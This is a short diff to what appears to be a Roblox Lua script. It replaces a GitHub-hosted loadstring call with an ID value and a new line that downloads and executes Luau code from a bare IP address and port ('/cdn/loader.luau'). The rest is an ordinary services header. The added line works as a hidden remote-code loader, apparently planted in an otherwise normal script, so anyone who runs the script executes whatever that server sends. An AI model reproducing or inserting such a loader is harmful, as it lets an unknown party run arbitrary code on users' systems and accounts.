@@ -1,4 +1,5 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/filtpants/filtpants-script/refs/heads/main/FIltPants"))()
+ID="0effe5eb-5de7-4901-a1a8-0d73dbf33352";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 
 -- SERVICES
 local TweenService = game:GetService("TweenService")
